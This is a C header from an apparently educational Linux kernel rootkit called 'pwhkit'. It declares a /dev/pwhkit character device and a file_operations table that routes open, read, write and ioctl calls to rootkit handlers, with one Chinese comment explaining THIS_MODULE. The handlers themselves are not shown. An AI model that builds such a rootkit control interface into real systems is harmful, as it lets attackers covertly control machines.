#ifndef PWHROOTKIT_H
#define PWHROOTKIT_H

#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/device.h>
#include "rootkitops.h"

#define DEVICE_NAME "pwhkit"
#define DEVICE_PATH "/dev/pwhkit"
#define CLASS_NAME "pwhkit"


static int major_num;
static int erro_code;
static struct class *module_class = NULL;
static struct device *module_device = NULL;
static struct file * __file = NULL;
static struct inode * __inode = NULL;


static struct file_operations pwh_rootkit_fops = {
    .owner = THIS_MODULE,   //这里是内核中实现的一个宏,标示出编译阶段生成的与当前内核模块关联的struct module结构体的地址
    .open = pwh_rootkit_open,
    .read = pwh_rootkit_read,
    .write = pwh_rootkit_write,
    .release = pwh_rootkit_release, 
    .unlocked_ioctl = pwh_rootkit_ioctl,
};

#endif


